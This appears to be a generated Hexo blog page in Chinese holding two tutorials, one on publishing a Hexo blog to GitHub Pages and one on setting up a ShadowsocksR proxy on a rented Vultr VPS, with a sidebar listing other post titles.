+<h2 id="注册Github帐号"><a href="#注册Github帐号" class="headerlink" title="注册Github帐号"></a>注册Github帐号</h2><p><a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a></p>
+<p>世界上最大的同性♂交友网站，满足你的一切幻想……先注册帐号</p>
+<p>然后在右上角“+”处新建一个新的仓库，创建好仓库之后点进去，选择settings，下拉到Github Pages</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-5cb2ce5e683641ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-7e55576b59aac9b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h2 id="安装设置Hexo"><a href="#安装设置Hexo" class="headerlink" title="安装设置Hexo"></a>安装设置Hexo</h2><p>首先在本地建立一个新的文件夹用以存放你的博客文件，比如我存的是 C:\ blog directory,我在虚拟机上只建立了一个盘，大家当然可以放在D、E、F……上</p>
+<p>在建立好文件夹之后，在文件夹位置右键打开Git Bash，在git bash 中输入：</p>
+<p>npm i hexo-cli -g<br>hexo -v</p>
+<p>来进行安装和检查是否安装好Hexo</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-ea56b348729df3fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>然后输入：</p>
+<p>hexo init<br>npm install </p>
+<p>安装需要的组件，安装完成之后，输入：</p>
+<p>hexo g</p>
+<p>即generate，用来生成文本</p>
+<p>hexo s</p>
+<p>即server，然后可以通过访问localhost：4000进行本地预览</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-ba15845ce4b79380.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h2 id="本地远程连接Github"><a href="#本地远程连接Github" class="headerlink" title="本地远程连接Github"></a>本地远程连接Github</h2><p>输入如下命令，yueyuehuman是我的信息，改成自己的</p>
+<p>git config –global user.name “yueyuehuman”<br>git config –global user.email “<a href="mailto:yueyuehuman@gmail.com">yueyuehuman@gmail.com</a>“<br>ssh-keygen -t rsa -C “<a href="mailto:yueyuehuman@gmail.com">yueyuehuman@gmail.com</a>“</p>
+<p>然后访问Github Settings，选择SSH and GPG keys，把生成的密钥复制进去</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-40423c20d5205970.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h3 id="小技巧："><a href="#小技巧：" class="headerlink" title="小技巧："></a>小技巧：</h3><p>很多人说在输入上述命令时候按照提示信息输入会报错：大概是：Can not find files or directory</p>
+<p>所以你在生成密钥时候不要管他提示，直接生成，然后在本地直接寻找./ssh/id_rsa.pub文件就行，然后用记事本打开文件，把所有的信息直接复制进去就行，之后输入：</p>
+<p>ssh -T <a href="mailto:git@github.com">git@github.com</a></p>
+<p>来测试一下是否成功，如果成功如下图：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-38e640c88aef102b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>如果解决了上述错误，又出现什么cannot entry block，说明_config.yml文件中格式有误，这个是Hexo的一大bug！它解析语句时候必须遵循</p>
+<p>类型名+冒号+空格+参数，有些语句可能没空格，就会导致错误，因此需要进.yml文件中自己排查。</p>
+<p>然后打开博客根目录下_config.yml文件，修改最后一行配置，同样的改成自己的仓库名：</p>
+<p>deploy：<br>  type：git<br>  repository： <a href="https://github.com/yueyuehuman/John_blog" target="_blank" rel="noopener">https://github.com/yueyuehuman/John_blog</a><br>  branch：master</p>
+<h1 id="0x03-发布你的博客"><a href="#0x03-发布你的博客" class="headerlink" title="0x03 发布你的博客"></a>0x03 发布你的博客</h1><p>首先在博客根目录下右键打开git bash，安装一个扩展</p>
+<p>npm i hexo-deployer-git</p>
+<p>然后输入hexo new post “你的文章名”，新建一篇文章。</p>
+<p>然后打开C：\blog\source_posts<code>的目录，可以发现下面多了一个文件夹和一个</code>.md文件，一个用来存放你的图片等数据，另一个就是你的文章。</p>
+<p>编写完markdown文件后，根目录下输入hexo g生成静态网页，输入hexo d上传到github上。这时打开你的github.io主页就能看到发布的文章啦。</p>
+<h3 id="小提示："><a href="#小提示：" class="headerlink" title="小提示："></a>小提示：</h3><p>当然很多人发现可以上去了，但是不加载js和css之类的文件，太丑了，还是打开_config.yml</p>
+<p>在url和root中分别加入你的博客地址和仓库名，博客地址就是在githubpages中提示的，仓库名就是最上面的，格式一定严格按照下图，缺少引号或者前后的斜线都无法被识别，然后重新上传，效果如下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-8e06fa362a657659.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-beb6d900e63f17da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/14/Github_pages+hexo%20to%20start%20up%20your%20blog/" data-id="ck7h5xsot0004xsb36xig7lbd" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/blog/" rel="tag">blog</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-vultr+ss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/12/vultr+ss/" class="article-date">
+  <time datetime="2020-02-12T00:57:47.000Z" itemprop="datePublished">2020-02-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/02/12/vultr+ss/">从零开始搭建梯子</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-为什么要搭梯子"><a href="#0x01-为什么要搭梯子" class="headerlink" title="0x01 为什么要搭梯子"></a>0x01 为什么要搭梯子</h1><p>为了能够访问更多的资源，还是需要通过搭梯子实现科学上网</p>
+<h1 id="0x02-具体步骤"><a href="#0x02-具体步骤" class="headerlink" title="0x02 具体步骤"></a>0x02 具体步骤</h1><h2 id="租vps"><a href="#租vps" class="headerlink" title="租vps"></a>租vps</h2><p>我使用vultr提供的vps，性价比比较高，选择的是3.5刀的最便宜的配置，操作系统选的是CentOS6，ubuntu系统总是莫名其妙出现玄学错误。。。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-bb01b2bc65740bda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>vps基本信息</p>
+<p>然后点击vps，查看详细信息，特别是记录下来用户名和口令，之后SSH登录配置要用</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-7931deb1d519904b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>详细信息</p>
+<h2 id="远程登录安装ssR"><a href="#远程登录安装ssR" class="headerlink" title="远程登录安装ssR"></a>远程登录安装ssR</h2><p>然后利用SSH进行远程登录，常见软件如Putty、Bitvise、XShell等，强烈推荐Bitvise，附带了SFTP，很方便本机和vps之间的文件共享。</p>
+<p>我用的也是Bitvise，输入vps的ip，然后设定一个端口号，尽量不要用默认的22端口，容易被……（你懂得）</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-5efede2d9fdcf2f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>利用Bitvise远程登录</p>
+<p>输入完口令之后就会弹出一个窗口（你的vps的）</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-41cc112dad54a98a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>成功登陆vps</p>
+<p>然后就可以下载shadowsocks或者ssR，我下载的是ssR下载完成后输入sh shadowsocksR.sh运行安装过程，只需输入口令和端口就可以继续：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-40b7ced844808cda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>基本配置</p>
+<p>安装成功后会返回这个界面，注意一定要记住IP、端口、口令和加密算法四个，利用本机shadowsocks填写信息时候要用：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-2d89c1a0b8ffb8e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>配置完成后的ssR</p>
+<p>当然如果觉得慢还可以利用锐速或者谷歌BBR，但是这两个模式本身是冲突的（对linux系统内核版本需求不同），在这里不赘述了，我用的是锐速。</p>
+<h2 id="下载ss并且访问google"><a href="#下载ss并且访问google" class="headerlink" title="下载ss并且访问google"></a>下载ss并且访问google</h2><p>最后从<a href="https://github.com/shadowsocks/shadowsocks-windows/releases/tag/4.1.9.2可以下载到支持各种操作系统的shadowsocks，当然安装完成后如果没用用户界面弹出可能是缺少.NET" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks-windows/releases/tag/4.1.9.2可以下载到支持各种操作系统的shadowsocks，当然安装完成后如果没用用户界面弹出可能是缺少.NET</a> Framework 4.7，再自己下载一些就行。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-efa82009cdfeaee7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p>shadowsocks连接</p>
+<p>然后就可以愉快的访问Google了</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-e29bc423e702f332.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/12/vultr+ss/" data-id="ck7h5xsox0008xsb3fg237ra6" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vps-shadowsocks/" rel="tag">vps shadowsocks</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/algorithmic-bias/" rel="tag">algorithmic bias</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/" rel="tag">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vps-shadowsocks/" rel="tag">vps shadowsocks</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/algorithmic-bias/" style="font-size: 10px;">algorithmic bias</a> <a href="/tags/blog/" style="font-size: 20px;">blog</a> <a href="/tags/vps-shadowsocks/" style="font-size: 10px;">vps shadowsocks</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/03/07/Poc%20of%20CVE-2020-1938/">CVE-2020-1938</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/07/Poc%20of%20CVE-2020-0688/">CVE-2020-0688</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/07/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2020/02/26/Algorithmic%20bias/">算法偏见</a>
+          </li>
+        
+          <li>
+            <a href="/2020/02/15/How%20to%20embellish%20your%20blog/">如何美化自己的博客</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
